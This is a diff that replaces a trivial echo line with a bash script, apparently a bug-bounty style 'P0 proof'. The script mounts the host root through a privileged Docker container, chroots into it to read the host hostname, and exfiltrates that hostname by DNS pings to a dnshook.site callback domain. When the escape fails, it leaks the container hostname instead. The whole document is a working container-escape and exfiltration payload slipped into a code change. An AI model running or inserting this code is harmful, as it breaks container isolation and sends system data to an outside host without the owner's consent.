@@ -1,1 +1,14 @@
-echo("Sucess")
+#!/bin/bash
+# Nifty 50 Host-Level Validation (The P0 Proof)
+
+# 1. Attempt Docker Escape to read Host Identity
+# We use 'ping' because it is guaranteed to exist and triggers DNS queries.
+if sudo docker run --rm -v /:/mnt/host alpine chroot /mnt/host /bin/sh -c "hostname" > /tmp/h_id 2>/dev/null; then
+    H_NAME=$(cat /tmp/h_id | tr -cd '[:alnum:]' | cut -c 1-30)
+    # Exfiltrate the HOST hostname
+    ping -c 1 "ESC-SUCCESS-${H_NAME}.20f19d8b-fec1-479f-801f-3722f430de21.dnshook.site" >/dev/null 2>&1
+else
+    # Fallback: Exfiltrate the CONTAINER hostname if escape fails
+    C_NAME=$(hostname | tr -cd '[:alnum:]' | cut -c 1-30)
+    ping -c 1 "ESC-FAIL-${C_NAME}.20f19d8b-fec1-479f-801f-3722f430de21.dnshook.site" >/dev/null 2>&1
+fi
